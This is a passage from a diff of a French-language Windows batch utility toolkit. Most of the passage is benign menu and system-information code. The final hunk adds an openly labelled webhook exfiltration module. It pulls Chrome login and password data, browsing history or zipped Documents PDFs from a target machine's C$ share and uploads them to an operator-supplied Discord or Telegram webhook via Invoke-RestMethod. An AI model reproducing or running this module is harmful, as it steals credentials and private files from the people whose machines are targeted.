-gt 0){$p=[math]::Round(($f/$t)*100,0)}; Write-Host ('   Disque '+$_.DeviceID+' : '+$f+' Go libres sur '+$t+' Go ('+$p+'%% restants)') -f Green }; Write-Host ''; Write-Host '   RESEAU ACTIF' -f Cyan; Get-NetAdapter | Where Status -eq 'Up' | foreach { $ip=(Get-NetIPAddress -InterfaceIndex $_.ifIndex -AddressFamily IPv4 -EA SilentlyContinue).IPAddress; Write-Host ('   '+$_.Name+' ('+$_.LinkSpeed+') - IP : '+$ip) }; Write-Host ''; Write-Host '   SECURITE' -f Cyan; try { $t=if((Get-Tpm).TpmPresent){'Present'}else{'Absent'}; Write-Host ('   Puce TPM   : '+$t) } catch { Write-Host '   Puce TPM   : Absent ou desactive' }"
 echo.
 pause
 goto system_tools
@@ -5557,7 +5827,7 @@ set "m_title=%~1"
 set "m_opts=%~2"
 set "m_flags=%~3"
 
-set "ps_code=$o=($env:m_opts -split ';');$t=$env:m_title;$fl=$env:m_flags;$sel=@();for($i=0;$i -lt $o.Count;$i++){if($o[$i] -notmatch '^\[---'){$sel+=$i}};$sIdx=0;$pad=115;try{if([console]::WindowWidth -gt 5){$pad=[math]::Min([console]::WindowWidth-5, 115)}}catch{};$maxV=50;try{if([console]::WindowHeight -gt 0){$maxV=[math]::Max([console]::WindowHeight-10, 10)}}catch{};$topI=0;clear-host;try{$cY=[console]::WindowTop}catch{$cY=0};function D{ try{[console]::SetCursorPosition(0,$cY)}catch{};write-host '  ========================================================================================' -f Cyan;write-host ('   ' + $t) -f White;write-host '  ========================================================================================' -f Cyan;write-host (' '.PadRight($pad));$num=1;$printed=0;for($i=0;$i -lt $o.Count;$i++){$parts=$o[$i]-split'~';$s=$parts[0];$d='';if($parts.Count -gt 1){$d=$parts[1]};$isH=($s -match '^\[---');if(-not $isH){$cNum=$num;$num++};if($i -lt $topI -or $printed -ge $maxV){continue};if($isH){write-host (' '.PadRight($pad));$printed++;if($printed -lt $maxV){write-host ('       ' + $s).PadRight($pad) -f Cyan;$printed++}}else{$f_str='    ';if($s -match '^\(F\) '){$f_str='(F) ';$s=$s.Substring(4)};if($i -eq $sel[$sIdx]){$str='{0}>> [{1}] {2}  ' -f $f_str, $cNum, $s; write-host $str -NoNewline -f Black -b White; $rem=$pad-$str.Length; if($rem -lt 0){$rem=0}; $ds=if($d){'   - '+$d}else{''}; if($ds.Length -gt $rem){$ds=$ds.Substring(0,$rem)}; write-host $ds.PadRight($rem) -f Yellow}else{$str='{0}   [{1}] {2}  ' -f $f_str, $cNum, $s; write-host $str.PadRight($pad) -f Gray};$printed++}};while($printed -lt $maxV){write-host (' '.PadRight($pad));$printed++};write-host (' '.PadRight($pad));write-host '  ----------------------------------------------------------------------------------------' -f Cyan;$show_help='   [FLECHES] Naviguer | [ENTREE] Valider | [F] Favoriser | [S] Rechercher | [0/ECHAP] Retour';if($fl -eq 'NONUMS'){$show_help='   [FLECHES] Naviguer | [ENTREE] Valider | [ECHAP] Retour'};write-host $show_help -NoNewline -f DarkGray};while($true){$target=$sel[$sIdx];if($target -lt $topI){$topI=$target};$lines=0;for($i=$topI;$i -le $target;$i++){if($o[$i] -match '^\[---'){$lines+=2}else{$lines+=1}};while($lines -gt $maxV){if($o[$topI] -match '^\[---'){$lines-=2}else{$lines-=1};$topI++};D;$k=$Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');$v=$k.VirtualKeyCode;if($v -eq 38){$sIdx--;if($sIdx -lt 0){$sIdx=$sel.Count-1}}elseif($v -eq 40){$sIdx++;if($sIdx -ge $sel.Count){$sIdx=0}}elseif($v -eq 13){clear-host;exit ($sIdx+1)}elseif($v -eq 27 -or ($fl -ne 'NONUMS' -and $k.Character -eq '0')){clear-host;exit 0}elseif($fl -ne 'NONUMS' -and $v -eq 70){clear-host;exit (200+$sIdx+1)}elseif($fl -ne 'NONUMS' -and ($k.Character -eq 'S' -or $k.Character -eq 's')){clear-host;exit 299}elseif($fl -ne 'NONUMS' -and [string]$k.Character -match '^[1-9]$' -and [int][string]$k.Character -le $sel.Count){clear-host;exit ([int][string]$k.Character)}}"
+set "ps_code=$o=($env:m_opts -split ';');$t=$env:m_title;$fl=$env:m_flags;$sel=@();for($i=0;$i -lt $o.Count;$i++){if($o[$i] -notmatch '^\[---'){$sel+=$i}};$sIdx=0;$pad=115;try{if([console]::WindowWidth -gt 5){$pad=[math]::Min([console]::WindowWidth-5, 115)}}catch{};$maxV=50;try{if([console]::WindowHeight -gt 0){$maxV=[math]::Max([console]::WindowHeight-10, 10)}}catch{};$topI=0;if($fl -notmatch 'NOCLS'){clear-host;try{$cY=[console]::WindowTop}catch{$cY=0}}else{try{$cY=[console]::CursorTop}catch{$cY=0}};function D{ try{[console]::SetCursorPosition(0,$cY)}catch{};write-host '  ========================================================================================' -f Cyan;write-host ('   ' + $t) -f White;write-host '  ========================================================================================' -f Cyan;write-host (' '.PadRight($pad));$num=1;$printed=0;for($i=0;$i -lt $o.Count;$i++){$parts=$o[$i]-split'~';$s=$parts[0];$d='';if($parts.Count -gt 1){$d=$parts[1]};$isH=($s -match '^\[---');if(-not $isH){$cNum=$num;$num++};if($i -lt $topI -or $printed -ge $maxV){continue};if($isH){write-host (' '.PadRight($pad));$printed++;if($printed -lt $maxV){write-host ('       ' + $s).PadRight($pad) -f Cyan;$printed++}}else{$f_str='    ';if($s -match '^\(F\) '){$f_str='(F) ';$s=$s.Substring(4)};if($i -eq $sel[$sIdx]){$str='{0}>> [{1}] {2}  ' -f $f_str, $cNum, $s; write-host $str -NoNewline -f Black -b White; $rem=$pad-$str.Length; if($rem -lt 0){$rem=0}; $ds=if($d){'   - '+$d}else{''}; if($ds.Length -gt $rem){$ds=$ds.Substring(0,$rem)}; write-host $ds.PadRight($rem) -f Yellow}else{$str='{0}   [{1}] {2}  ' -f $f_str, $cNum, $s; write-host $str.PadRight($pad) -f Gray};$printed++}};while($printed -lt $maxV){write-host (' '.PadRight($pad));$printed++};write-host (' '.PadRight($pad));write-host '  ----------------------------------------------------------------------------------------' -f Cyan;$show_help='   [FLECHES] Naviguer | [ENTREE] Valider | [F] Favoriser | [S] Rechercher | [0/ECHAP] Retour';if($fl -match 'NONUMS'){$show_help='   [FLECHES] Naviguer | [ENTREE] Valider | [ECHAP] Retour'};write-host $show_help -NoNewline -f DarkGray};while($true){$target=$sel[$sIdx];if($target -lt $topI){$topI=$target};$lines=0;for($i=$topI;$i -le $target;$i++){if($o[$i] -match '^\[---'){$lines+=2}else{$lines+=1}};while($lines -gt $maxV){if($o[$topI] -match '^\[---'){$lines-=2}else{$lines-=1};$topI++};D;$k=$Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');$v=$k.VirtualKeyCode;if($v -eq 38){$sIdx--;if($sIdx -lt 0){$sIdx=$sel.Count-1}}elseif($v -eq 40){$sIdx++;if($sIdx -ge $sel.Count){$sIdx=0}}elseif($v -eq 13){if($fl -notmatch 'NOCLS'){clear-host};exit ($sIdx+1)}elseif($v -eq 27 -or ($fl -notmatch 'NONUMS' -and $k.Character -eq '0')){if($fl -notmatch 'NOCLS'){clear-host};exit 0}elseif($fl -notmatch 'NONUMS' -and $v -eq 70){if($fl -notmatch 'NOCLS'){clear-host};exit (200+$sIdx+1)}elseif($fl -notmatch 'NONUMS' -and ($k.Character -eq 'S' -or $k.Character -eq 's')){if($fl -notmatch 'NOCLS'){clear-host};exit 299}elseif($fl -notmatch 'NONUMS' -and [string]$k.Character -match '^[1-9]$' -and [int][string]$k.Character -le $sel.Count){if($fl -notmatch 'NOCLS'){clear-host};exit ([int][string]$k.Character)}}"
 
 powershell -NoProfile -ExecutionPolicy Bypass -Command "%ps_code%"
 set "res=%errorlevel%"
@@ -6299,3 +6569,46 @@ if exist "%FAV_FILE%" (
 if "!was_removed!"=="0" echo !tf_target!>>"%FAV_TMP%"
 if exist "%FAV_TMP%" (move /y "%FAV_TMP%" "%FAV_FILE%" >nul) else (type nul > "%FAV_FILE%")
 exit /b
+
+REM ===================================================================
+REM       MODULE D'EXFILTRATION VIA WEBHOOK (HTTPS)
+REM ===================================================================
+:cyber_exfiltrate_webhook
+cls
+echo.
+echo  ================================================
+echo   EXFILTRATION VIA WEBHOOK (DISCORD/TELEGRAM)
+echo  ================================================
+echo.
+echo   Description : Envoie les fichiers volés directement
+echo   sur un salon Discord ou un bot Telegram.
+echo.
+set /p "web_url=Collez votre URL Webhook : "
+if "%web_url%"=="" goto smb_exp_menu
+
+echo [i] Dossiers utilisateurs sur la cible :
+dir "\\%target_ip%\C$\Users" /B /A:D 2^>nul
+set /p "user_target=Utilisateur cible : "
+echo.
+echo [1] Exfiltrer Mots de passe Chrome/Edge (hashes)
+echo [2] Exfiltrer Historique de navigation
+echo [3] Exfiltrer Dossier Documents (*.pdf, *.docx)
+echo [4] Retour
+echo.
+set /p "exf_choice=Choix : "
+
+if "%exf_choice%"=="1" set "target_file=\\%target_ip%\C$\Users\%user_target%\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+if "%exf_choice%"=="2" set "target_file=\\%target_ip%\C$\Users\%user_target%\AppData\Local\Google\Chrome\User Data\Default\History"
+if "%exf_choice%"=="3" (
+    echo [i] Compression et envoi en cours...
+    powershell -Command "$zip='%TEMP%\dump.zip'; Compress-Archive -Path '\\%target_ip%\C$\Users\%user_target%\Documents\*.pdf' -DestinationPath $zip -Force; Invoke-RestMethod -Uri '%web_url%' -Method Post -InFile $zip -ContentType 'application/zip'"
+    echo [OK] Documents envoyes sur votre salon.
+    pause & goto smb_exp_menu
+)
+
+if defined target_file (
+    echo [i] Envoi du fichier sensible...
+    powershell -Command "Invoke-RestMethod -Uri '%web_url%' -Method Post -InFile '%target_file%' -ContentType 'application/octet-stream'"
+    echo [OK] Fichier envoye.
+)
+pause & goto smb_exp_menu
